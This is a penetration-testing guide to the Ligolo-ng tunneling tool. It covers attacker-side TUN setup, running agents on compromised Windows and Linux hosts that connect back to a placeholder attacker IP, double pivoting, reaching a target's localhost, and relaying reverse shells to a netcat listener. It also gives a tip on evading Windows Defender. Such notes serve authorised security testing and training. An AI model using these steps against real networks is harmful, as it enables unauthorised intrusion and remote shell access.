---
title: 'Ligolo-ng (Advanced Pivoting)'
description: 'A comprehensive guide to Ligolo-ng for advanced network pivoting, double pivoting, and reverse shell relays.'
tags: ['pivoting', 'ligolo-ng', 'networking', 'tradecraft']
---

# 🕸️ Ligolo-ng: Advanced Network Pivoting

Ligolo-ng is an incredibly fast, lightweight, and advanced tunneling tool that uses a `TUN` interface to create a virtual network stack in userland. Unlike traditional SOCKS proxies (such as `proxychains` or `Chisel`), Ligolo-ng integrates directly with your host's routing table.

This allows you to use your native tools (`nmap`, `crackmapexec`, `smbclient`, `metasploit`) naturally, without any proxy wrappers or LD_PRELOAD hacks, as if you were physically plugged into the target network.

!!! note
      **Source Repository:** [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

---

## 1. Architecture

Ligolo-ng consists of two main components:
*   **The Proxy (Attacker):** Runs on your attack machine. It manages the `TUN` interface and orchestrates traffic.
*   **The Agent (Target):** Runs on the compromised machine. It connects back to the proxy and forwards packets into the internal network.

Because it operates at Layer 3 (IP layer) and creates a direct interface, there are no limitations like ICMP unreachability seen in typical SOCKS proxies.

---

## 2. Environment Preparation (Attacker Setup)

Before running the proxy, you must create a `TUN` interface on your attacker machine.

### Creating the Interface

Run the following commands on your attack box to initialize the virtual network interface (`ligolo`):

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Avoiding `sudo` for Proxy Execution

By default, manipulating raw network interfaces requires root privileges. You can bind specific capabilities to the Ligolo-ng proxy binary to allow it to run without `sudo` (which is generally safer):

```bash
sudo setcap cap_net_admin,cap_net_raw+eip ./proxy
```

---

## 3. Basic Deployment

### Starting the Proxy

Launch the proxy on your attack machine. Generating self-signed certificates on the fly is usually sufficient for internal pivots:

```bash
./proxy -selfcert
```
*By default, the proxy listens on port `11601`.*

### Connecting the Agent

Transfer the agent binary to the compromised target (Windows or Linux) and connect back to your attack machine:

```powershell
# Windows Target
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

```bash
# Linux Target
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

> [!TIP]
> **OPSEC Consideration:** If deploying to a modern Windows environment, consider renaming the binary or using in-memory execution, as default Ligolo-ng binaries are often flagged by Windows Defender.

### Activating the Tunnel

Once the agent connects, your proxy terminal will notify you of a new session.

1. Type `session` and select the connected agent.
2. Type `ifconfig` in the Ligolo prompt to view the target's internal network ranges (e.g., `10.10.10.0/24`).
3. Add a route to your local attack machine's routing table:
   ```bash
   # On your attacker host's terminal (NOT the ligolo prompt):
   sudo ip route add 10.10.10.0/24 dev ligolo
   ```
4. Back in the Ligolo prompt, type `start` to activate the tunnel.

You can now natively reach the `10.10.10.0/24` network!

---

## 4. The "Magic" IP: Targeting Localhost

Ligolo-ng reserves the **240.0.0.0/4** CIDR range for special routing purposes. 

If you want to access services bound to `127.0.0.1` on the compromised agent (e.g., a local MySQL database or an internal web application), you can route traffic to `240.0.0.1`.

```bash
# Add the route on your attacker machine
sudo ip route add 240.0.0.1/32 dev ligolo

# Now you can scan the target's localhost directly!
nmap -p- 240.0.0.1
```

---

## 5. Double & Multi-Hop Pivoting

Ligolo-ng makes double pivoting exponentially easier than chaining proxychains.

### Scenario:
*   **Network A:** `10.10.10.0/24` (First pivot - Agent 1)
*   **Network B:** `10.10.20.0/24` (Target deep inside the network)

### Execution:

1. Connect **Agent 1** and start the tunnel as detailed in Section 3. Add the route for Network A.
2. To prepare for the second agent, add a listener in the Ligolo proxy prompt on Agent 1. This tells Agent 1 to listen on a local port and forward connections back to your proxy:
   ```text
   [Agent : domain/user@AGENT1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
3. Transfer a new Ligolo agent binary to the compromised machine in Network A (Target 2).
4. Run **Agent 2**, telling it to connect to **Agent 1's** internal IP:
   ```bash
   ./agent -connect 10.10.10.X:11601 -ignore-cert
   ```
5. Agent 2 will traverse the tunnel, and you will see a new session pop up in your proxy terminal.
6. Switch to the new session, type `start`, and add the route for Network B on your attacker machine:
   ```bash
   sudo ip route add 10.10.20.0/24 dev ligolo
   ```

You are now natively routing traffic across a double pivot!

---

## 6. Reverse Shell Relays (Listener Mode)

One of Ligolo-ng's most powerful features is catching reverse shells from deep within the network without touching `socat` or SSH port forwarding.

If you are exploiting a target in `10.10.20.0/24` and need a reverse shell back to your attacker machine (`10.10.14.X`), but the target cannot reach you directly:

1. In your Ligolo proxy prompt (focused on the agent sitting between you and the target), create a listener:
   ```text
   [Agent : domain/user@AGENT1] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
   ```
2. Start your netcat listener on your attacker machine:
   ```bash
   nc -lvnp 4444
   ```
3. Execute your reverse shell payload on the deep target, pointing it to **Agent 1's** internal IP on port `4444`. 

The traffic hits Agent 1, Ligolo intercepts it, encrypts it, tunnels it back to your `127.0.0.1`, and Netcat catches the shell!

---

## 7. Cheatsheet & Troubleshooting

### Command Quick Reference
| Goal | Command / Location |
| :--- | :--- |
| **Setup TUN** | `sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up` |
| **Start Proxy** | `./proxy -selfcert` |
| **Run Agent** | `./agent -connect <proxy_ip>:11601 -ignore-cert` |
| **Start Tunnel** | `start` (Inside Proxy Prompt) |
| **Add Route (Host)** | `sudo ip route add <cidr> dev ligolo` |
| **Add Route (Proxy)** | `interface_add_route --name <iface> --route <cidr>` (Wait for agent) |
| **Target Localhost** | Target `240.0.0.1` after adding route. |

### Common Issues

*   **Ping works but TCP fails:** Ensure you typed `start` in the Ligolo proxy prompt. Just having the agent connect is not enough; the tunnel must be explicitly started.
*   **Cannot route to `240.0.0.1`:** Double-check your local routing table (`ip route`). Ensure `240.0.0.1/32 dev ligolo` is present.
*   **Agent dies immediately:** This usually indicates a certificate issue (did you forget `-ignore-cert`?) or the target endpoint is blocked by a host-based firewall.
